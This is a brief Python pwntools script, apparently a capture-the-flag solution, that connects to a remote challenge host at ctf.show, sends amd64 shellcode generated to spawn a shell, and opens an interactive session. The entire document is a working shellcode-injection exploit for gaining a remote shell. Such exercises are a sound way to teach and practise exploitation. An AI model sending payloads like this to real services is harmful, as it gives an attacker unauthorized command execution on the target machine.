from pwn import * 
context.arch = 'amd64'#64
io =remote("dasctf_sixbytes.challenge.ctf.show",28074)
payload=asm(shellcraft.sh())
io.send(payload)
io.interactive()